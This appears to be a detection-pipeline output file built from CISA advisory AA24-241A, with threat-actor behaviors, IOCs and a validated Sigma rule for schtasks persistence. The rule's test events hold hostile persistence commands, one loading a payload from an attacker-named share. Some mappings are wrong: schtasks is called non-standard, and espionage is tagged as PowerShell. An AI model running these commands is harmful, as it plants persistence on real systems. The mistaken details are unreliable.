@@ -1,0 +1,2750 @@
+{
+  "run_id": "20261018-004654-0fd717",
+  "created_at": "2026-10-18T00:48:09.832137+00:00",
+  "source": {
+    "mode": "url",
+    "urls": [
+      "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a"
+    ],
+    "query": "",
+    "tavily_used": true,
+    "chars": 30761
+  },
+  "report": {
+    "title": "Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations",
+    "summary": "Iran-based cyber actors (Pioneer Kitten/Fox Kitten/UNC757 etc.) have been conducting intrusions since 2017, exploiting public-facing VPNs and web appliances to gain initial access, establishing persistence via web shells and scheduled tasks, collaborating with ransomware affiliates (NoEscape, Ransomhouse, ALPHV) for encryption, and conducting separate espionage operations for the GOI. They use Shodan for reconnaissance, disable security tools, and exfiltrate sensitive data.",
+    "threat_actors": [
+      "Pioneer Kitten",
+      "Fox Kitten",
+      "UNC757",
+      "Parisite",
+      "RUBIDIUM",
+      "Lemon Sandstorm",
+      "Br0k3r",
+      "xplfinder"
+    ],
+    "malware_families": [],
+    "targets": [
+      "Education",
+      "Finance",
+      "Healthcare",
+      "Defense",
+      "Local Government",
+      "Israel",
+      "Azerbaijan",
+      "UAE"
+    ],
+    "behaviors": [
+      {
+        "id": "B1",
+        "description": "Actors scan Shodan to identify IP addresses hosting devices vulnerable to specific CVEs before exploitation.",
+        "attack_technique_id": "T1596",
+        "attack_tactic": "Discovery",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "Shodan[.]io search for vulnerable devices",
+            "note": "Used to enumerate internet-facing assets"
+          },
+          {
+            "kind": "network_ip",
+            "value": "138.68.90.19",
+            "note": "Observed C2/infrastructure IP"
+          },
+          {
+            "kind": "network_ip",
+            "value": "167.99.202.130",
+            "note": "Observed C2/infrastructure IP"
+          }
+        ],
+        "logsource": {
+          "category": "dns_query",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "The actors have been observed using the Shodan search engine to identify and enumerate IP addresses that host devices vulnerable to a particular CVE.",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B2",
+        "description": "Actors exploit public-facing networking devices (Citrix Netscaler, F5 BIG-IP, Pulse Secure/Ivanti VPN, PanOS firewalls, Check Point Gateways) to gain initial access.",
+        "attack_technique_id": "T1190",
+        "attack_tactic": "Initial Access",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "\\CVE-2019-19781",
+            "note": "Citrix Netscaler exploitation"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\CVE-2022-1388",
+            "note": "F5 BIG-IP exploitation"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\CVE-2024-21887",
+            "note": "Pulse Secure/Ivanti VPN exploitation"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\CVE-2024-3400",
+            "note": "PanOS firewall exploitation"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\CVE-2024-24919",
+            "note": "Check Point Gateway exploitation"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors scan and exploit public-facing networking devices, including the following devices and associated CVEs: * Citrix Netscaler (CVEs-2019-19781 and CVE-2023-3519) * F5 BIG-IP (CVE-2022-1388) * Pulse Secure/Ivanti VPNs (CVE-2024-21887) * PanOS firewalls (CVE-2024-3400) * Check Point Security Gateways (CVE-2024-24919)",
+        "confidence": 0.98,
+        "detectable": true
+      },
+      {
+        "id": "B3",
+        "description": "Actors deploy web shells (version.dll, ctxHeaderLogon.php, etc.) on compromised Netscaler devices for persistent remote access.",
+        "attack_technique_id": "T1505.003",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "\\version.dll",
+            "note": "Malicious backdoor deployed on Netscaler"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\ctxHeaderLogon.php",
+            "note": "Web shell observed on compromised devices"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\netscaler.php",
+            "note": "Web shell observed on compromised devices"
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "Iranian cyber actors capture login credentials on compromised Netscaler devices via deployed webshell; create a directory on Netscaler devices for webshell deployment; deploy webshells on compromised Netscaler devices in two directories (observed closely after system owning patching); and place the malicious backdoor version.dll.",
+        "confidence": 0.93,
+        "detectable": true
+      },
+      {
+        "id": "B4",
+        "description": "Actors create local accounts on victim networks for persistence and lateral movement.",
+        "attack_technique_id": "T1136.001",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "net user /add",
+            "note": "Local account creation command"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\\\*\\*\\*\\*\\*",
+            "note": "Placeholder for newly created account path"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors create local accounts on victim networks.",
+        "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B5",
+        "description": "Actors use administrator credentials to disable antivirus and security software on compromised networks.",
+        "attack_technique_id": "T1562.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "Disable-Antivirus or Set-MpProtected",
+            "note": "PowerShell commands to disable security tools"
+          },
+          {
+            "kind": "process_name",
+            "value": "cmd.exe",
+            "note": "Used to run security disable commands"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors use administrator credentials to disable antivirus and security software.",
+        "confidence": 0.92,
+        "detectable": true
+      },
+      {
+        "id": "B6",
+        "description": "Actors lower PowerShell execution policies to a less secure level to enable script execution.",
+        "attack_technique_id": "T1562.010",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
+            "note": "PowerShell policy downgrade command"
+          }
+        ],
+        "logsource": {
+          "category": "ps_script",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "Iranian cyber actors lower PowerShell policies to a less secure level.",
+        "confidence": 0.88,
+        "detectable": true
+      },
+      {
+        "id": "B7",
+        "description": "Actors deploy AnyDesk and Meshcentral remote access programs for command and control.",
+        "attack_technique_id": "T1219",
+        "attack_tactic": "Command and Control",
+        "observables": [
+          {
+            "kind": "file_name",
+            "value": "AnyDesk.exe",
+            "note": "Remote access program installed"
+          },
+          {
+            "kind": "file_name",
+            "value": "Meshcentral.exe",
+            "note": "Remote access program deployed"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors install “AnyDesk” remote access program. Iranian cyber actors deploy Meshcentral to connect with compromised servers for remote access.",
+        "confidence": 0.96,
+        "detectable": true
+      },
+      {
+        "id": "B8",
+        "description": "Actors use ligolo/ligolo-ng and ngrok.io for protocol tunneling to create outbound C2 connections.",
+        "attack_technique_id": "T1572",
+        "attack_tactic": "Command and Control",
+        "observables": [
+          {
+            "kind": "file_name",
+            "value": "ligolo-ng",
+            "note": "Tunneling tool used for C2"
+          },
+          {
+            "kind": "network_domain",
+            "value": "ngrok[.]io",
+            "note": "Outbound C2 domain"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors use ligolo / ligolo-ng for open source tunneling and ngrok[.]io NGROK to create outbound connections to a random subdomain.",
+        "confidence": 0.94,
+        "detectable": true
+      },
+      {
+        "id": "B9",
+        "description": "Actors export registry hives and network firewall configurations during discovery phase.",
+        "attack_technique_id": "T1012",
+        "attack_tactic": "Discovery",
+        "observables": [
+          {
+            "kind": "registry_key",
+            "value": "HKEY_LOCAL_MACHINE\\SYSTEM",
+            "note": "Registry hive export target"
+          },
+          {
+            "kind": "registry_key",
+            "value": "HKEY_CURRENT_USER\\Software",
+            "note": "Registry hive export target"
+          }
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "Iranian cyber actors export registry hives and network firewall configurations.",
+        "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B10",
+        "description": "Actors exfiltrate account usernames from domain controllers and access configuration files and logs.",
+        "attack_technique_id": "T1482",
+        "attack_tactic": "Discovery",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "dsquery user domainroot",
+            "note": "Domain user enumeration command"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors exfiltrate account usernames from the domain controller and access configuration files and logs.",
+        "confidence": 0.89,
+        "detectable": true
+      },
+      {
+        "id": "B11",
+        "description": "Actors collaborate with ransomware affiliates (NoEscape, Ransomhouse, ALPHV) providing network access and strategizing extortion.",
+        "attack_technique_id": "T1657",
+        "attack_tactic": "Impact",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "ransomware deployment coordination",
+            "note": "Collaboration with ransomware affiliates"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "After infiltrating victim networks, the actors collaborate with ransomware affiliates (including NoEscape, Ransomhouse, and ALPHV) in exchange for a percentage of the ransom payments by providing affiliates with access to victim networks, locking victim networks, and strategizing to extort victims.",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B12",
+        "description": "Actors conduct separate espionage operations stealing sensitive technical data for the GOI from Israel and Azerbaijan networks.",
+        "attack_technique_id": "T1059.001",
+        "attack_tactic": "Exfiltration",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "Remote Desktop session initiation via admin account",
+            "note": "Used for initial access and lateral movement"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "The FBI further assesses these Iran-based cyber actors are associated with the Government of Iran and—separate from the ransomware activity—conduct computer network exploitation activity in support of the GOI (such as intrusions enabling the theft of sensitive technical data against organizations in Israel and Azerbaijan).",
+        "confidence": 0.92,
+        "detectable": true
+      },
+      {
+        "id": "B13",
+        "description": "Actors deploy scheduled tasks using DLL side-loading and backdoor techniques for persistence.",
+        "attack_technique_id": "T1053",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "schtasks /create /sc onlogon",
+            "note": "Scheduled task creation for persistence"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\\\contig.exe",
+            "note": "Observed binary used in persistence"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\\\dllhost.ext",
+            "note": "Observed binary used in persistence"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors implement a scheduled task that uses a DLL side-loading technique and a scheduled task that loads malware through back doors.",
+        "confidence": 0.91,
+        "detectable": true
+      },
+      {
+        "id": "B14",
+        "description": "Actors create a directory on Netscaler devices for webshell deployment as part of persistence mechanism.",
+        "attack_technique_id": "T1505",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "\\/var/vpn/themes/imgs/",
+            "note": "Netscaler webshell deployment directory"
+          },
+          {
+            "kind": "file_path",
+            "value": "\\/xui/common/images/",
+            "note": "Netscaler webshell deployment directory"
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows",
+          "service": ""
+        },
+        "evidence": "Iranian cyber actors create a directory on Netscaler devices for webshell deployment; observed closely after system owning patching.",
+        "confidence": 0.87,
+        "detectable": true
+      },
+      {
+        "id": "B15",
+        "description": "Actors use valid compromised credentials to log into domain controllers and other infrastructure.",
+        "attack_technique_id": "T1078.002",
+        "attack_tactic": "Credential Access",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "Domain admin login via RDP or PowerShell",
+            "note": "Valid accounts: Domain Accounts usage"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Iranian cyber actors repurpose administrative credentials of network admins to log into domain controllers and other infrastructure.",
+        "confidence": 0.9,
+        "detectable": true
+      }
+    ],
+    "iocs": [
+      {
+        "type": "ip",
+        "value": "138.68.90.19"
+      },
+      {
+        "type": "ip",
+        "value": "167.99.202.130"
+      },
+      {
+        "type": "ip",
+        "value": "78.141.238.182"
+      },
+      {
+        "type": "ip",
+        "value": "51.16.51.81"
+      },
+      {
+        "type": "ip",
+        "value": "51.20.138.134"
+      },
+      {
+        "type": "ip",
+        "value": "134.209.30.220"
+      },
+      {
+        "type": "ip",
+        "value": "13.53.124.246"
+      },
+      {
+        "type": "domain",
+        "value": "api.gupdate.net"
+      },
+      {
+        "type": "domain",
+        "value": "githubapp.net"
+      },
+      {
+        "type": "domain",
+        "value": "login.forticloud.online"
+      },
+      {
+        "type": "domain",
+        "value": "fortigate.forticloud.online"
+      },
+      {
+        "type": "domain",
+        "value": "cloud.sophos.one"
+      }
+    ]
+  },
+  "plan": {
+    "candidates": [
+      {
+        "id": "D1",
+        "title": "Schtasks Scheduled Task Creation With DLL Side-Loading",
+        "behavior_ids": [
+          "B13"
+        ],
+        "attack_technique_ids": [
+          "T1053"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "Actors create scheduled tasks via schtasks.exe with '/create /sc onlogon' arguments to achieve persistence through DLL side-loading. The schtasks binary is not a standard Windows utility; its presence combined with these specific arguments is highly distinctive.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Legitimate administrative use of schtasks.exe if the tool is used in the environment for task scheduling. Mitigate by verifying the binary is not a known management tool and the command line includes the onlogon trigger with DLL side-loading context.",
+        "priority": "high"
+      },
+      {
+        "id": "D2",
+        "title": "PowerShell Execution Policy Downgrade To Bypass",
+        "behavior_ids": [
+          "B6"
+        ],
+        "attack_technique_ids": [
+          "T1562.010"
+        ],
+        "logsource": {
+          "category": "ps_script",
+          "product": "windows",
+          "service": ""
+        },
+        "rationale": "Actors lower the PowerShell execution policy to 'Bypass' scope 'Process' to enable unrestricted script execution. This specific policy downgrade is a strong indicator of defense evasion and is directly observable in PowerShell script block logging.",
+        "key_fields": [
+          "ScriptBlockText"
+        ],
+        "false_positive_risks": "Developers or administrators temporarily setting ExecutionPolicy to Bypass for interactive debugging. The rule should require both 'Bypass' and 'Scope Process' to appear together, which is less common in benign interactive use.",
+        "priority": "high"
+      },
+      {
+        "id": "D3",
+        "title": "Registry Hive Export Of SYSTEM And User Hives",
+        "behavior_ids": [
+          "B9"
+        ],
+        "attack_technique_ids": [
+          "T1012"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows",
+          "service": ""
+        },
+        "rationale": "Actors export registry hives including the SYSTEM hive and HKCU\\Software for offline credential and configuration harvesting. Writing to these high-value hive paths via registry_set events is rare outside of backup/recovery tools.",
+        "key_fields": [
+          "TargetObject"
+        ],
+        "false_positive_risks": "Legitimate backup software (e.g., Windows Backup, Veeam) or system restore operations may export registry hives. Exclude known backup agent image paths; a single event targeting the SYSTEM hive is already suspicious in non-backup contexts.",
+        "priority": "medium"
+      },
+      {
+        "id": "D4",
+        "title": "Netscaler Web Shell File Creation",
+        "behavior_ids": [
+          "B3"
+        ],
+        "attack_technique_ids": [
+          "T1505.003"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows",
+          "service": ""
+        },
+        "rationale": "Actors deploy specific web shell files (version.dll, ctxHeaderLogon.php, netscaler.php) on compromised Citrix Netscaler appliances. These filenames are not part of legitimate Netscaler installations and directly indicate persistence backdoors.",
+        "key_fields": [
+          "TargetFilename"
+        ],
+        "false_positive_risks": "Netscaler firmware updates or custom theme deployments might write PHP files to the web directory. The specific names 'version.dll', 'ctxHeaderLogon.php', and 'netscaler.php' are not known legitimate components. Verify against Citrix file manifests.",
+        "priority": "high"
+      },
+      {
+        "id": "D5",
+        "title": "Ligolo-ng Tunneling Connection To Ngrok",
+        "behavior_ids": [
+          "B8"
+        ],
+        "attack_technique_ids": [
+          "T1572"
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "Actors use the ligolo-ng tunneling tool to create outbound C2 connections via ngrok.io subdomains. The combination of the ligolo-ng binary (uncommon in enterprise) connecting to ngrok.io is a strong indicator of protocol tunneling for command and control.",
+        "key_fields": [
+          "Image",
+          "DestinationHostname"
+        ],
+        "false_positive_risks": "Developers or red teams using ligolo-ng and ngrok.io for legitimate tunneling. In most enterprise environments, both the binary and the domain are anomalous. Consider allow-listing known developer workstations.",
+        "priority": "medium"
+      }
+    ],
+    "skipped": [
+      "B1: Shodan reconnaissance is conducted from attacker infrastructure; DNS queries to shodan.io from internal hosts are not a durable on-host behavior.",
+      "B2: Exploitation of public-facing appliances (Citrix, F5, etc.) occurs on the appliance OS, not observable via Windows endpoint telemetry.",
+      "B4: Local account creation via 'net user /add' is a valid technique but lower priority than the schtasks persistence mechanism (B13) which is more distinctive.",
+      "B5: Antivirus disable via PowerShell cmdlets; covered conceptually by B6 (policy downgrade) and the specific cmdlets are less durable than the policy change.",
+      "B7: AnyDesk/Meshcentral are legitimate remote administration tools; high false positive rate in managed environments.",
+      "B10: Domain enumeration via dsquery is specific but shares process_creation logsource with higher-priority B13; can be added later.",
+      "B11: Ransomware affiliate coordination lacks durable on-host observables.",
+      "B12: Espionage RDP usage is generic; no distinctive command-line or binary.",
+      "B14: Netscaler webshell deployment directory creation; overlaps with B3 file creation and uses Linux paths not matching Windows file_event.",
+      "B15: Valid credential use for DC access is generic RDP; no distinctive on-host behavior."
+    ],
+    "notes": "Selected five candidates across five logsource categories (process_creation, ps_script, registry_set, file_event, network_connection) and four tactics (Persistence, Defense Evasion, Discovery, Command and Control). Prioritized behaviors with distinctive binaries, command lines, or target objects over generic techniques. Skipped IOC-only, appliance-only, or high-FP behaviors."
+  },
+  "rules": [
+    {
+      "candidate_id": "D1",
+      "title": "Schtasks Scheduled Task Creation With Onlogon Trigger For Persistence",
+      "sigma_yaml": "title: Schtasks Scheduled Task Creation With Onlogon Trigger For Persistence\nid: a52cc835-e1f1-4341-9a36-263eec53a0f3\nstatus: experimental\ndescription: 'Detects creation of scheduled tasks via schtasks.exe with ''/create /sc onlogon'' arguments indicative of persistence\n  mechanisms used by threat actors.'\nreferences:\n- 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1053\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    'Image|endswith': '\\schtasks.exe'\n    'CommandLine|contains|all':\n    - /create\n    - /sc\n    - onlogon\n  filter_legitimate_admin:\n    'ParentImage|endswith':\n    - '\\mmc.exe'\n    - '\\taskschd.msc'\n  filter_office_integrator:\n    ParentImage:\n    - 'C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe'\n    - 'C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe'\n    'Image|endswith':\n    - '\\schtasks.exe'\n    'CommandLine|contains': 'Microsoft\\Office\\Office Performance Monitor'\n  filter_windows_update:\n    'ParentImage|endswith': '\\wuauclt.exe'\n    'CommandLine|contains': 'Microsoft\\Windows\\WindowsUpdate\\'\n  filter_sccm_intune:\n    'ParentImage|endswith':\n    - '\\policyplatform.exe'\n    - '\\sscmsvc.exe'\n    - '\\intuneextensionservice.exe'\n    'CommandLine|contains': '/create /tn *'\n  condition: 'selection and not 1 of filter_*'\nfalsepositives:\n- Legitimate administrative use of schtasks.exe for creating scheduled tasks with onlogon trigger\n- Software installation or update processes using schtasks.exe\n- Enterprise management tools (SCCM, Intune) creating scheduled tasks during provisioning\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1053",
+        "T1053.005"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Schtasks creating scheduled task with onlogon trigger for persistence - typical attacker behavior",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc onlogon /tn \"UpdateService\" /tr \"C:\\Windows\\System32\\contig.exe\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Schtasks creating scheduled task with onlogon trigger - different casing and parent",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "CommandLine": "SCHTASKS.EXE /CREATE /SC ONLOGON /TN Backdoor /TR \"C:\\Users\\Public\\dllhost.ext\"",
+            "ParentImage": "C:\\Windows\\System32\\powershell.exe",
+            "User": "CORP\\john.doe"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Schtasks creating scheduled task with onlogon trigger - SysWOW64 path and unusual arguments",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "CommandLine": "schtasks /create /sc onlogon /ru system /rl highest /tn \"DefenderUpdate\" /tr \"C:\\ProgramData\\svchost.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate administrative use via Task Manager GUI",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /query /tn \"GoogleUpdateTaskMachineUA\"",
+            "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Office integrator creating scheduled task for performance monitoring",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /sc onstart /tn \"Office Performance Monitor\" /tr \"C:\\Program Files\\Microsoft Office\\root\\office16\\OUTLOOK.EXE\"",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Windows Update creating scheduled task for update orchestration",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /sc daily /st 02:00 /tn \"Microsoft-Windows-WindowsUpdateClient-TimeBasedTrigger\" /tr \"C:\\Windows\\System32\\wuauclt.exe /detectnow\"",
+            "ParentImage": "C:\\Windows\\System32\\wuauclt.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Schtasks with reordered parameters, mixed casing, extra whitespace, and double-quoted task path",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe  /sc   onlogon  /create  /tn  \"PersistenceTask\"  /tr  \"C:\\Windows\\Temp\\evil.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\alice"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Schtasks from SysWOW64 via PowerShell with single-quoted arguments and /ru /rl flags",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc onlogon /ru \"SYSTEM\" /rl highest /tn 'BackdoorTask' /tr 'C:\\ProgramData\\malicious.dll'",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Schtasks invoked from wscript with UNC path target and no quotes around task name",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc onlogon /tn UpdateCheck /tr \\\\ATTACKER-SERVER\\share\\payload.dll",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+            "User": "CORP\\bob"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Schtasks with environment variable in target path and abbreviated flags (if supported by binary)",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc onlogon /tn Persist /tr %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.dll",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\charlie"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Legitimate admin creating scheduled task with onlogon via schtasks but from mmc.exe (filtered by filter_legitimate_admin)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc onlogon /tn \"AdminTask\" /tr \"C:\\Windows\\System32\\legit.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Office integrator creating performance monitor task (matches filter_office_integrator)",
+          "event": {
+            "Image": "C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe",
+            "CommandLine": "integrator.exe /create /tn \"Microsoft\\Office\\Office Performance Monitor\" /sc onlogon",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe",
+            "User": "CORP\\user1"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Windows Update client creating update task (matches filter_windows_update)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wuauclt.exe",
+            "CommandLine": "wuauclt.exe /create /tn \"Microsoft\\Windows\\WindowsUpdate\\AutoUpdate\" /sc onlogon",
+            "ParentImage": "C:\\Windows\\System32\\wuauclt.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "SCCM policy platform creating task with /create /tn pattern (matches filter_sccm_intune)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\policyplatform.exe",
+            "CommandLine": "policyplatform.exe /create /tn \"SCCM_Task_123\" /sc onlogon /tr \"C:\\Windows\\CCM\\task.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\policyplatform.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D1",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE (Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%/create%' ESCAPE '\\' AND CommandLine LIKE '%/sc%' ESCAPE '\\' AND CommandLine LIKE '%onlogon%' ESCAPE '\\')) AND (NOT COALESCE(((ParentImage LIKE '%\\\\mmc.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\taskschd.msc' ESCAPE '\\') OR ((ParentImage LIKE 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe' ESCAPE '\\' OR ParentImage LIKE 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe' ESCAPE '\\') AND Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND CommandLine LIKE '%Microsoft\\\\Office\\\\Office Performance Monitor%' ESCAPE '\\') OR (ParentImage LIKE '%\\\\wuauclt.exe' ESCAPE '\\' AND CommandLine LIKE '%Microsoft\\\\Windows\\\\WindowsUpdate\\\\%' ESCAPE '\\') OR ((ParentImage LIKE '%\\\\policyplatform.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\sscmsvc.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\intuneextensionservice.exe' ESCAPE '\\') AND CommandLine LIKE '%/create /tn %' ESCAPE '\\')), 0))",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
